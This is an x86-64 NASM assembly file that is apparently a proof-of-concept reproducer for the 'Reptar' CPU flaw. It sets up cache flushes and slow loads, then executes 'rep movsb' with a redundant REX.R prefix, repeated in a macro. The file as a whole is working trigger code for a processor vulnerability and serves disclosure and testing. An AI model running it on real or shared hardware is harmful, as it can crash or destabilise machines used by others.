BITS 64

; rax ; USED (data address)
; rbx ; NOT USED
; rcx ; USED (for REP MOVSB)
; rdx ; USED (temporarily)
; rbp ; NOT USED
; rsp ; NOT USED
; rsi ; USED (for REP MOVSB)
; rdi ; USED (for REP MOVSB)
; r8  ; USED (for counter)
; r9  ; NOT USED
; r10 ; NOT USED
; r11 ; NOT USED
; r12 ; NOT USED
; r13 ; NOT USED
; r14 ; NOT USED
; r15 ; NOT USED

global _start

%macro loopless_reptar 0
    align 128
    %%loop_for_every_iteration:
        ; FLUSH TO MAKE INSTRUCTIONS BELOW SLOW
        clflush [one]
        clflush [seven]
        clflush [rax]
        clflush [rax+64]
        clflush [rax+128]

        add rax, [rax]
        mov rdx, [rax+64]
        div qword [one+rdx]
        mov rsi, [rax]
        cmp rcx, [seven+rsi+rdx]
        cmove rsi, rax
        mov rdi, [rax+128+rdx]
        lea rdi, [rsi+rdi]
        mov cl, [one+rdx]

        align 128
        %%reptar:
            rep
            db 0x44; rex.r
            movsb
        %%after_reptar:
            rep nop
            mov ebx, 0xcccccccc
            nop
            mov cl, 7
            mfence
            lfence
            sfence
%endmacro

section .data
    one: dq 0x1
    seven: dq 0x7
    data: times 512 db 0

section .text
    _start:
        mov cl, 7
        mov eax, data
        xor r8, r8
        ; make sure these dont pf
        clflush [data]
        clflush [one]
        clflush [seven]
        mfence
        %rep 2
            loopless_reptar
            inc r8
        %endrep
    .end_of_program:
    hlt
